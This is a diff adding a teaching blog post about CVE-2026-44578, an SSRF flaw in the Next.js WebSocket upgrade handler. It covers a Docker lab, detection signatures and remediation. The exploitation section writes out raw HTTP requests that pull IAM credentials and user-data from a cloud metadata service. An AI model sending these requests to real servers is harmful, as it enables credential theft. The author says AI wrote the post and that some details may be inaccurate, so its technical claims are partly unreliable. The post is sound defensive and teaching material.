@@ -1,0 +1,422 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+
+  <title>CVE-2026-44578 — Next.js WebSocket Upgrade SSRF: From Patch Analysis to Lab Design</title>
+  <meta name="description" content="Technical analysis of CVE-2026-44578, a Server-Side Request Forgery in Next.js WebSocket upgrade handler. Includes vulnerability breakdown, Docker lab architecture and remediation guidance." />
+  <meta name="author" content="Isacio Tamayo" />
+  <link rel="canonical" href="https://isacio-tamayo.ponciop.online/blog-nextjs-ssrf.html" />
+
+  <meta property="og:title" content="CVE-2026-44578 — Next.js WebSocket Upgrade SSRF: From Patch Analysis to Lab Design" />
+  <meta property="og:description" content="Technical analysis of CVE-2026-44578, a Server-Side Request Forgery in Next.js WebSocket upgrade handler. Includes vulnerability breakdown, Docker lab architecture and remediation guidance." />
+  <meta property="og:type" content="article" />
+  <meta property="og:url" content="https://isacio-tamayo.ponciop.online/blog-nextjs-ssrf.html" />
+  <meta property="og:site_name" content="Isacio Tamayo Portfolio" />
+  <meta property="og:locale" content="en_US" />
+  <meta property="og:locale:alternate" content="es_PA" />
+  <meta property="og:image" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+  <meta property="og:image:secure_url" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+  <meta property="og:image:type" content="image/png" />
+  <meta property="og:image:width" content="1672" />
+  <meta property="og:image:height" content="941" />
+  <meta property="og:image:alt" content="Isacio Tamayo Cloud DevOps Cybersecurity personal brand banner" />
+
+  <meta name="twitter:card" content="summary_large_image" />
+  <meta name="twitter:title" content="CVE-2026-44578 — Next.js WebSocket Upgrade SSRF: From Patch Analysis to Lab Design" />
+  <meta name="twitter:description" content="Technical analysis of CVE-2026-44578, a Server-Side Request Forgery in Next.js WebSocket upgrade handler. Includes vulnerability breakdown, Docker lab architecture and remediation guidance." />
+  <meta name="twitter:image" content="https://isacio-tamayo.ponciop.online/assets/img/brand/isacio-tamayo-wallpaper.png" />
+
+  <link rel="alternate" hreflang="en" href="https://isacio-tamayo.ponciop.online/blog-nextjs-ssrf.html" />
+  <link rel="alternate" hreflang="es" href="https://isacio-tamayo.ponciop.online/blog-nextjs-ssrf-es.html" />
+  <link rel="alternate" hreflang="x-default" href="https://isacio-tamayo.ponciop.online/blog-nextjs-ssrf.html" />
+
+  <link rel="icon" type="image/svg+xml" href="favicon.svg" />
+  <link rel="stylesheet" href="assets/css/styles.css" />
+
+    <style>
+    .blog-article { max-width: 780px; margin: 0 auto; padding: 0 1rem; }
+    .article-body { max-width: 780px; margin: 0 auto; padding: 0 1rem; }
+    .blog-article h1, .article-body h1 { font-size: clamp(1.75rem,4vw,2.5rem); line-height: 1.2; margin: 0 0 1rem; }
+    .blog-article h2, .article-body h2 { font-size: 1.5rem; margin: 2.5rem 0 1rem; border-left: 4px solid var(--accent); padding-left: 0.75rem; }
+    .blog-article h3, .article-body h3 { font-size: 1.2rem; margin: 1.75rem 0 0.75rem; }
+    .blog-article p, .article-body p { color: var(--muted); line-height: 1.75; margin-bottom: 1rem; }
+    .blog-article ul, .blog-article ol, .article-body ul, .article-body ol { margin-bottom: 1rem; padding-left: 1.5rem; }
+    .blog-article li, .article-body li { color: var(--muted); margin-bottom: 0.4rem; line-height: 1.6; }
+    .blog-article strong, .article-body strong { color: var(--text); }
+    .blog-article pre, .article-body pre { background: var(--card); color: var(--text); border: 1px solid var(--border); padding: 1.25rem; border-radius: 8px; overflow-x: auto; margin-bottom: 1.5rem; font-size: 0.85rem; line-height: 1.6; }
+    .blog-article code, .article-body code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, "Liberation Mono", monospace; }
+    .blog-article pre code, .article-body pre code { background: none; padding: 0; color: var(--text); }
+    .blog-article :not(pre) > code, .article-body :not(pre) > code { background: rgba(255,49,88,.10); padding: 0.15em 0.4em; border-radius: 4px; font-size: 0.9em; color: var(--accent); }
+    .blog-article table, .article-body table { width: 100%; border-collapse: collapse; margin-bottom: 1.5rem; font-size: 0.92rem; }
+    .blog-article th, .blog-article td, .article-body th, .article-body td { border: 1px solid var(--border); padding: 0.65rem 0.85rem; text-align: left; }
+    .blog-article th, .article-body th { background: var(--card-2); color: var(--text); font-weight: 600; }
+    .blog-article td, .article-body td { background: var(--card); color: var(--muted); }
+    .ascii-diagram, .diagram { background: var(--card); color: var(--accent-2); border: 1px solid var(--border); padding: 1.25rem; border-radius: 8px; overflow-x: auto; margin-bottom: 1.5rem; font-size: 0.8rem; line-height: 1.5; white-space: pre; font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; }
+    .severity-badge, .vuln-badge { display: inline-block; background: #ff3158; color: #17040a; padding: 0.2em 0.6em; border-radius: 4px; font-weight: 700; font-size: 0.9em; }
+    .warning-box, .callout.danger { background: rgba(255,49,88,.08); border-left: 4px solid var(--accent); padding: 1rem 1.25rem; border-radius: 4px; margin-bottom: 1.5rem; color: var(--muted); }
+    .warning-box strong, .callout.danger strong { color: var(--accent); }
+    .info-box, .callout.info { background: rgba(0,212,255,.08); border-left: 4px solid var(--accent-2); padding: 1rem 1.25rem; border-radius: 4px; margin-bottom: 1.5rem; color: var(--muted); }
+    .info-box strong, .callout.info strong { color: var(--accent-2); }
+    .highlight-box { background: var(--card); border-left: 4px solid var(--accent); padding: 1rem 1.25rem; border-radius: 0 8px 8px 0; margin-bottom: 1.5rem; color: var(--muted); }
+    .highlight-box strong { color: var(--accent); }
+    .blog-meta, .article-meta { display: flex; flex-wrap: wrap; gap: 1.5rem; margin-bottom: 1.5rem; font-size: 0.88rem; color: var(--muted); }
+    .back-link, .back-to-blog { display: inline-block; margin-bottom: 1.5rem; color: var(--accent-2); text-decoration: none; font-size: 0.9rem; }
+    .back-link:hover, .back-to-blog:hover { text-decoration: underline; }
+    .back-to-blog a { color: var(--accent-2); text-decoration: none; }
+    .back-to-blog a:hover { text-decoration: underline; }
+    .article-header, .article-hero { padding: 3rem 0 1.5rem; }
+    .article-header h1, .article-hero h1 { color: var(--text); }
+    .article-lang-switch { display: inline-flex; gap: 0.5rem; margin-top: 0.75rem; }
+    .article-lang-switch a { padding: 0.3rem 0.75rem; border: 1px solid var(--border); border-radius: 4px; font-size: 0.8rem; text-decoration: none; color: var(--muted); }
+    .article-lang-switch a.active, .article-lang-switch a:hover { border-color: var(--accent); color: var(--accent); }
+    .step-list { counter-reset: step-counter; list-style: none; padding-left: 0; }
+    .step-list li { counter-increment: step-counter; padding-left: 2.5rem; position: relative; margin-bottom: 1.25rem; }
+    .step-list li::before { content: counter(step-counter); position: absolute; left: 0; top: 0; width: 1.75rem; height: 1.75rem; background: var(--accent); color: #17040a; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-size: 0.8rem; font-weight: 700; }
+    .repo-link { display: inline-flex; align-items: center; margin-top: 1rem; padding: 10px 14px; border: 1px solid var(--border); border-radius: 10px; color: var(--text); text-decoration: none; background: var(--accent); font-weight: 800; }
+    .repo-link::before { content: ">"; margin-right: 8px; }
+    .repo-link:hover { background: #ff3158; color: #17040a; }
+  </style>
+
+</head>
+
+<body>
+  <header class="site-header">
+    <div class="container nav-wrap">
+      <a class="brand" href="index.html#top" aria-label="Home">
+        <span class="brand-mark"><img src="assets/img/brand/isacio-tamayo-logo.webp" alt="" /></span>
+        <span>Isacio Tamayo</span>
+      </a>
+
+      <div class="nav-right">
+        <input class="menu-toggle" type="checkbox" id="site-menu-toggle" aria-label="Toggle navigation menu" />
+        <label class="menu-button" for="site-menu-toggle"><span>PROFILE</span></label>
+        <nav class="desktop-nav" aria-label="Main navigation">
+          <a href="index.html#summary">Summary</a>
+          <a href="index.html#skills">Skills</a>
+          <a href="index.html#technologies">Tech Stack</a>
+          <a href="index.html#experience">Experience</a>
+          <a href="index.html#certifications">Credentials</a>
+          <a href="index.html#case-studies">Case Studies</a>
+          <a href="index.html#projects">Projects</a>
+          <a href="index.html#blog">Blog</a>
+          <a href="index.html#contact">Contact</a>
+        </nav>
+        <div class="language-switch" aria-label="Language selector">
+          <a class="active" href="blog-nextjs-ssrf.html" aria-current="page">EN</a>
+          <a href="blog-nextjs-ssrf-es.html">ES</a>
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main id="top">
+    <article class="section blog-article">
+      <div class="container">
+
+        <a class="back-link" href="index.html#blog">&larr; Back to blog</a>
+
+        <p class="eyebrow">CVE Research &middot; SSRF &middot; Next.js</p>
+        <h1>CVE-2026-44578 &mdash; Next.js WebSocket Upgrade SSRF: From Patch Analysis to Lab Design</h1>
+
+        <div class="blog-meta">
+          <strong>Isacio Tamayo</strong>
+          <time datetime="2026-08-15">August 2026</time>
+        </div>
+
+        <div class="info-box">
+          <strong>Disclaimer:</strong> Yes, I used AI to write this — it's 2026, everyone does — and it's my first
+          year teaching, so my students deserve content that doesn't put them to sleep. I teach networking
+          &amp; cybersecurity at university level, so this is (supposedly) accurate. It's based on a real CVE,
+          but like my students' excuses, some details may not be 100% airtight. Read it, learn from it, blame
+          me later.
+        </div>
+
+        <!-- Executive Summary -->
+        <h2>Executive Summary</h2>
+        <p>
+          CVE-2026-44578 is a <strong>Server-Side Request Forgery (SSRF)</strong> vulnerability
+          classified as <strong>CWE-918</strong> in the Next.js self-hosted Node.js server runtime.
+          It received a CVSS 3.1 score of <span class="severity-badge">8.6 HIGH</span>.
+        </p>
+        <p>
+          The flaw exists in the WebSocket upgrade handler and allows an unauthenticated remote
+          attacker to make the server issue arbitrary HTTP requests to internal services &mdash;
+          including cloud metadata endpoints &mdash; without any user interaction.
+        </p>
+
+        <table>
+          <tr><th>Field</th><th>Value</th></tr>
+          <tr><td>CVE ID</td><td>CVE-2026-44578</td></tr>
+          <tr><td>CWE</td><td>CWE-918 (Server-Side Request Forgery)</td></tr>
+          <tr><td>CVSS 3.1</td><td><span class="severity-badge">8.6 HIGH</span></td></tr>
+          <tr><td>Affected Versions</td><td>Next.js 13.4.13 &ndash; 15.5.15, 16.0.0 &ndash; 16.2.4</td></tr>
+          <tr><td>Patched In</td><td>15.5.16, 16.2.5</td></tr>
+          <tr><td>Attack Vector</td><td>Network (remote, unauthenticated)</td></tr>
+          <tr><td>User Interaction</td><td>None</td></tr>
+          <tr><td>Scope</td><td>Changed (impacts the server-side proxy target)</td></tr>
+          <tr><td>Impact</td><td>High Confidentiality, Low Integrity</td></tr>
+        </table>
+
+        <p>
+          This vulnerability only affects self-hosted deployments that use the built-in
+          <code>next start</code> Node.js server. Managed platforms (Vercel, Netlify) and
+          <code>next dev</code> are not affected.
+        </p>
+
+        <!-- Vulnerability Analysis -->
+        <h2>Vulnerability Analysis</h2>
+        <p>
+          The root cause lives in the WebSocket upgrade handler within Next.js internal
+          <code>router-server.ts</code>. Under normal conditions, when Next.js proxies an
+          incoming HTTP request via <code>http-proxy</code>, the response handler checks the
+          <code>finished</code> and <code>statusCode</code> flags before completing the
+          proxy flow. This is the safety gate that prevents open proxy behavior.
+        </p>
+        <p>
+          However, the WebSocket upgrade path calls <code>proxyRequest()</code> whenever
+          <code>parsedUrl</code> contains a protocol &mdash; and it
+          <strong>skips the <code>finished</code> and <code>statusCode</code> checks entirely</strong>.
+        </p>
+        <p>
+          The attack crafts a request line with a double-slash absolute URI:
+        </p>
+<pre><code>GET http:///path HTTP/1.1</code></pre>
+        <p>
+          The internal <code>normalizeRepeatedSlashes</code> function collapses
+          <code>http:///</code> down to <code>http:/</code> &mdash; a protocol with no
+          hostname. When this reaches <code>http-proxy</code>, the library falls back to
+          connecting to <strong>localhost:80</strong> while preserving the path. The resulting
+          internal request becomes:
+        </p>
+<pre><code>GET /path HTTP/1.1
+Host: localhost:80</code></pre>
+        <p>
+          To ensure the request reaches the vulnerable upgrade handler instead of the safe
+          HTTP handler, the attacker adds two headers:
+        </p>
+<pre><code>Connection: Upgrade
+Upgrade: websocket</code></pre>
+        <p>
+          These headers cause Next.js to route the request through the WebSocket upgrade
+          code path, where the missing validation allows the forged request to complete.
+        </p>
+
+        <!-- Lab Architecture -->
+        <h2>Lab Architecture</h2>
+        <p>
+          To study this vulnerability safely, I built a self-contained Docker Compose lab
+          with two containers sharing a single isolated Docker network:
+        </p>
+        <ul>
+          <li><strong>nextjs-vuln</strong> &mdash; Next.js 15.5.0 running the vulnerable
+              "Nimbus Analytics" app on port 3000.</li>
+          <li><strong>imds-sidecar</strong> &mdash; A fake AWS IMDSv1 metadata service
+              running on <code>localhost:80</code> inside the same network namespace.
+              This service is <strong>not reachable from the Docker host directly</strong>,
+              proving the SSRF path.</li>
+        </ul>
+        <div class="ascii-diagram">┌─────────────────────────────────────────────────────────┐
+│                    Docker Network                       │
+│                                                         │
+│  ┌──────────────────────┐   ┌────────────────────────┐  │
+│  │   nextjs-vuln        │   │   imds-sidecar         │  │
+│  │                      │   │                        │  │
+│  │  Next.js 15.5.0      │   │  Fake IMDSv1 mock      │  │
+│  │  :3000 (exposed)     │   │  :80 (internal only)   │  │
+│  │                      │   │                        │  │
+│  │  SSRF via upgrade    │──▶│  /latest/meta-data/*   │  │
+│  │  handler             │   │                        │  │
+│  └──────────────────────┘   └────────────────────────┘  │
+│                                                         │
+│  IMDS mock is NOT reachable from the host directly.     │
+│  Only accessible via SSRF through nextjs-vuln.          │
+└─────────────────────────────────────────────────────────┘
+        Host ──▶ :3000 ──▶ SSRF ──▶ :80 (IMDS)</div>
+        <p>
+          This topology mirrors a real AWS EC2 scenario where the IMDS runs on
+          <code>169.254.169.254:80</code> and is unreachable from the public internet
+          but accessible from within the instance.
+        </p>
+
+        <!-- Exploitation Chain -->
+        <h2>Exploitation Chain</h2>
+        <p>
+          The full exploitation follows four steps, moving from fingerprinting to
+          credential extraction.
+        </p>
+
+        <h3>Step 1 &mdash; Server Fingerprinting</h3>
+        <p>
+          Next.js self-hosted servers expose a <code>x-powered-by</code> header
+          (or similar indicators). A basic HTTP request reveals the framework and
+          the presence of the Node.js runtime:
+        </p>
+<pre><code>curl -sI http://TARGET:3000/
+# Look for x-powered-by: Next.js or x-nextjs-*</code></pre>
+
+        <h3>Step 2 &mdash; Enumerate the Metadata Service via SSRF</h3>
+        <p>
+          Using the WebSocket upgrade SSRF, reach the internal IMDS mock (or a
+          real AWS metadata endpoint in production):
+        </p>
+<pre><code>GET http:///latest/meta-data/ HTTP/1.1
+Host: TARGET:3000
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13</code></pre>
+        <p>
+          The server connects to <code>localhost:80</code> and returns the IMDS
+          directory listing: <code>ami-id</code>, <code>instance-id</code>,
+          <code>iam/</code>, <code>user-data</code>, etc.
+        </p>
+
+        <h3>Step 3 &mdash; Extract IAM Credentials</h3>
+        <p>
+          Enumerate the IAM role name, then request temporary credentials:
+        </p>
+<pre><code># Discover role name
+GET http:///latest/meta-data/iam/security-credentials/ HTTP/1.1
+Host: TARGET:3000
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13
+
+# Extract credentials for the role
+GET http:///latest/meta-data/iam/security-credentials/ec2-role-name HTTP/1.1
+Host: TARGET:3000
+Connection: Upgrade
+Upgrade: websocket
+Sec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==
+Sec-WebSocket-Version: 13</code></pre>
+        <p>
+          The response contains <code>AccessKeyId</code>,
+          <code>SecretAccessKey</code> and <code>Token</code> &mdash; full
+          temporary AWS credentials valid for the role's configured duration.
+        </p>
+
+        <h3>Step 4 &mdash; Access User-Data and Instance Identity</h3>
+        <p>
+          The same SSRF path can retrieve startup scripts and instance metadata:
+        </p>
+<pre><code>GET http:///latest/user-data HTTP/1.1
+...
+GET http:///latest/dynamic/instance-identity/document HTTP/1.1
+...</code></pre>
+        <p>
+          User-data frequently contains plaintext secrets, API keys, database
+          connection strings and deployment scripts. The instance identity document
+          reveals account ID, instance type, region and availability zone.
+        </p>
+
+        <!-- Detection Signatures -->
+        <h2>Detection Signatures</h2>
+        <p>
+          Detection can be split between server-side log analysis and
+          network-level inspection.
+        </p>
+
+        <h3>Server-Side Log Indicators</h3>
+        <p>
+          When the SSRF triggers, the Next.js process logs a failed proxy attempt.
+          Look for:
+        </p>
+<pre><code>Failed to proxy http:/</code></pre>
+        <p>
+          This message appears in the <code>stdout</code> / <code>stderr</code> of
+          the <code>next start</code> process. In production, feed this into your
+          SIEM or log aggregation pipeline with an alert threshold.
+        </p>
+
+        <h3>Network-Level Indicators</h3>
+        <p>
+          At the network or WAF layer, detect requests that combine all three
+          elements of the attack:
+        </p>
+        <ol>
+          <li>Request line containing an absolute URI with <code>http:</code> or
+              <code>https:</code> (e.g., <code>GET http:///</code>)</li>
+          <li>Header <code>Connection: Upgrade</code></li>
+          <li>Header <code>Upgrade: websocket</code></li>
+        </ol>
+        <p>
+          A WAF rule matching all three conditions provides a strong detection
+          signal with minimal false positives, since legitimate traffic never
+          combines absolute URIs in the request line with WebSocket upgrade
+          headers.
+        </p>
+
+        <!-- Remediation -->
+        <h2>Remediation</h2>
+
+        <h3>Immediate Fix &mdash; Update Next.js</h3>
+        <p>
+          Upgrade to a patched version as soon as possible:
+        </p>
+<pre><code>npm install next@15.5.16
+# or
+npm install next@16.2.5</code></pre>
+
+        <h3>Mitigations When Patching Is Delayed</h3>
+        <p>If an immediate update is not feasible, apply these layered mitigations:</p>
+
+        <ol>
+          <li>
+            <strong>Block WebSocket upgrades at the reverse proxy.</strong>
+            If you front Next.js with nginx or a cloud load balancer, drop
+            requests carrying <code>Upgrade: websocket</code> from untrusted
+            sources.
+          </li>
+          <li>
+            <strong>Enforce IMDSv2.</strong>
+            On AWS, set <code>HttpTokens=required</code> on the instance
+            profile. IMDSv2 requires a session token via PUT request, which
+            cannot be obtained through a simple GET-based SSRF.
+          </li>
+          <li>
+            <strong>Block absolute URIs in nginx.</strong>
+            Add a rule to reject malformed request lines at the edge:
+          </li>
+        </ol>
+<pre><code># nginx.conf — block absolute URIs in the request line
+if ($request_uri ~* "^https?://") {
+    return 400;
+}</code></pre>
+        <p>
+          This strips the attack surface before it ever reaches Next.js. It is
+          also a sensible hardening measure regardless of this CVE, since
+          absolute URIs in the request line are non-standard for reverse proxy
+          configurations.
+        </p>
+
+        <!-- Repository -->
+        <h2>Repository</h2>
+        <p>
+          The full lab &mdash; including Docker Compose files, the vulnerable Next.js
+          app, the IMDS mock, an automated exploit script and a multi-flag CTF
+          challenge &mdash; is available on GitHub:
+        </p>
+        <p>
+          <a href="https://github.com/isaca0315/CVE-2026-44578-next-js-ssrf" target="_blank" rel="noopener noreferrer">
+            github.com/isaca0315/CVE-2026-44578-next-js-ssrf
+          </a>
+        </p>
+
+        <br />
+        <a class="back-link" href="index.html#blog">&larr; Back to blog</a>
+
+      </div>
+    </article>
+  </main>
+
+  <footer class="footer">
+    <div class="container footer-inner">
+      <p>&copy; 2026 Isacio Tamayo &middot; DevOps &middot; Cloud &middot; Cybersecurity Portfolio</p>
+      <a href="index.html#top">Back to top</a>
+    </div>
+  </footer>
+</body>
+</html>
